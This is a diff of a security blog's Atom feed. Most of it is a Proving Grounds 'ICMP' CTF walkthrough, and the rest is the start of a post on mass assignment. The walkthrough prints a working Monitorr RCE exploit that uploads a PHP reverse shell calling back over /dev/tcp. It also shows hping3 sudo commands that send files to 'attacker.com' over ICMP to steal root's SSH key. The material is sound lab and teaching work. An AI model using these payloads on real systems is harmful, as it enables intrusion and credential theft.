@@ -1,19 +1,800 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-04-10T20:17:15+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Naveen J</title><subtitle>A blog about IT-Security and related stuff.</subtitle><entry><title type="html">Account Takeover via manipulating Session Storage</title><link href="http://localhost:4000/Account_Takeover-via-session-storage/" rel="alternate" type="text/html" title="Account Takeover via manipulating Session Storage" /><published>2023-04-01T12:00:00+05:30</published><updated>2023-04-01T12:00:00+05:30</updated><id>http://localhost:4000/Account_Takeover-via-session-storage</id><content type="html" xml:base="http://localhost:4000/Account_Takeover-via-session-storage/">&lt;h1 id=&quot;target-background&quot;&gt;Target Background&lt;/h1&gt;
-&lt;p&gt;A Web application which can be used for financial purposes, in which we can generate the invoice, track and reconcile them. And the payments can be done for the invoices and money can be managed completely through the application	.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-16T08:23:52+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Naveen J</title><subtitle>A blog about IT-Security and related stuff.</subtitle><entry><title type="html">Proving grounds Play: ICMP</title><link href="http://localhost:4000/Proving_grounds_Play-ICMP/" rel="alternate" type="text/html" title="Proving grounds Play: ICMP" /><published>2023-07-14T12:00:00+05:30</published><updated>2023-07-14T12:00:00+05:30</updated><id>http://localhost:4000/Proving_grounds_Play-ICMP</id><content type="html" xml:base="http://localhost:4000/Proving_grounds_Play-ICMP/">&lt;h1 id=&quot;walkthrough-on-youtube&quot;&gt;Walkthrough on Youtube&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://youtu.be/6fyL_fFyV4c&quot;&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/youtube.png&quot; alt=&quot;youtube&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;NMAP&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/nmap.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;port-80-tech-stack&quot;&gt;PORT 80 Tech Stack&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Operating System: Debian&lt;/li&gt;
+  &lt;li&gt;Web Technology: Apache, PHP (view-page-source)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;monitorr&quot;&gt;Monitorr&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/monitorr%20version.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/searchsploit_search.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;exploit-code&quot;&gt;Exploit Code&lt;/h3&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin&apos;s Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;specify params in format: python &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; target_url lhost lport&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/assets/php/upload.php&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/plain, */*; q=0.01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-Requested-With&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;XMLHttpRequest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Referer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-----------------------------31046105003900160576454225745&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Disposition: form-data; name=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;fileToUpload&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;; filename=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;she_ll.php&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Type: image/gif&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GIF89a213213123&amp;lt;?php shell_exec(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; 0&amp;gt;&amp;amp;1&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-----------------------------31046105003900160576454225745--&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A shell script should be uploaded. Now we try to execute it&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/assets/data/usrimg/she_ll.php&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Upgrade-Insecure-Requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;obtaining-reverse-shell&quot;&gt;Obtaining Reverse Shell&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/rce1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Obtained local flag&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/local_flag.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;h3 id=&quot;obtain-user&quot;&gt;Obtain user&lt;/h3&gt;
+
+&lt;p&gt;The permission is denied to access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;devel&lt;/code&gt; folder as current user is not a system user. But as the tip found in the reminder file below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/reminder.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The php file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crypt.php&lt;/code&gt; inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;devel&lt;/code&gt; folder disclosed the SSH password for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;crypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;BUHNIJMONIBUVCYTTYVGBUHJNI&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;da&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;User access obtained.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/user.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;root-privilege-escalation&quot;&gt;Root Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;Check the current user sudo permissions.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/sudo-l.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Search for exploit in GTFO bins for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hping3&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;sudo&quot;&gt;Sudo&lt;/h3&gt;
+
+&lt;p&gt;If the binary is allowed to run as superuser by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;hping3
+/bin/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The file is continuously sent, adjust the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--count&lt;/code&gt; parameter or kill the sender when done. Receive on the attacker box with:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;hping3 &lt;span class=&quot;nt&quot;&gt;--icmp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--listen&lt;/span&gt; xxx &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;RHOST=attacker.com
+LFILE=file_to_read&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;hping3 &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RHOST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--icmp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; 500 &lt;span class=&quot;nt&quot;&gt;--sign&lt;/span&gt; xxx &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;transfering-ssh-key-locally-to-obtain-root-access-through-hping3&quot;&gt;Transfering SSH key locally to obtain root access through hping3&lt;/h2&gt;
+
+&lt;h3 id=&quot;icmp-listener&quot;&gt;ICMP Listener&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/icmp-listener.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;icmp-data-send&quot;&gt;ICMP: Data send&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/icmp_key_send.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;icmp-data-receive&quot;&gt;ICMP: Data Receive&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/icmp_root_ssh_key.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ssh-root-user&quot;&gt;SSH Root User&lt;/h2&gt;
+
+&lt;p&gt;SSH to the root user using the obtained root SSH key.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/root.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Root user access and proof.txt obtained&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/ICMP/proof.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+
+&lt;p&gt;For more insights and updates, follow me on Twitter: &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;@thevillagehacker&lt;/a&gt;.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="CTF" /><category term="Offsec labs" /><category term="Wtriteup" /><summary type="html">Walkthrough on Youtube</summary></entry><entry><title type="html">Unveiling the Consequences: Database Dump Exploitation through Mass Assignment Vulnerability</title><link href="http://localhost:4000/Database_Dump_Exploitation_through_Mass_Assignment_Vulnerability/" rel="alternate" type="text/html" title="Unveiling the Consequences: Database Dump Exploitation through Mass Assignment Vulnerability" /><published>2023-07-13T22:10:00+05:30</published><updated>2023-07-13T22:10:00+05:30</updated><id>http://localhost:4000/Database_Dump_Exploitation_through_Mass_Assignment_Vulnerability</id><content type="html" xml:base="http://localhost:4000/Database_Dump_Exploitation_through_Mass_Assignment_Vulnerability/">&lt;h1 id=&quot;blog-post&quot;&gt;Blog Post&lt;/h1&gt;
+
+&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Mass assignment vulnerability, also known as over-posting vulnerability, is a security flaw that can occur in web applications that utilize frameworks or libraries that automatically bind user-submitted data to corresponding model properties or database columns. This vulnerability allows attackers to manipulate and modify sensitive data by submitting unexpected or unauthorized values for those properties.&lt;/p&gt;
+
+&lt;p&gt;The vulnerability arises when developers don’t properly validate or sanitize user input before assigning it to model properties. In certain frameworks, this behavior is convenient as it simplifies the process of mapping user input to model objects. However, it becomes a security concern when sensitive fields, such as authentication credentials, access controls, or administrative privileges, can be manipulated by malicious users.&lt;/p&gt;
+
+&lt;p&gt;Here’s an example to illustrate the issue:&lt;/p&gt;
+
+&lt;p&gt;Consider a web application that allows users to update their profile information, such as name, email, and password. The application uses a framework that automatically binds the form data to the corresponding fields in the user model.&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;User&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ActiveRecord&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Base&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;attr_accessible&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:email&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Vulnerable code&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the above code, the developer has used the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attr_accessible&lt;/code&gt;&lt;/strong&gt; method to specify that the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;email&lt;/code&gt;&lt;/strong&gt; fields are accessible and can be assigned from user input.&lt;/p&gt;
+
+&lt;p&gt;However, an attacker can manipulate the request payload by adding additional form fields that were not intended to be modified by the user, such as:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/profile&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
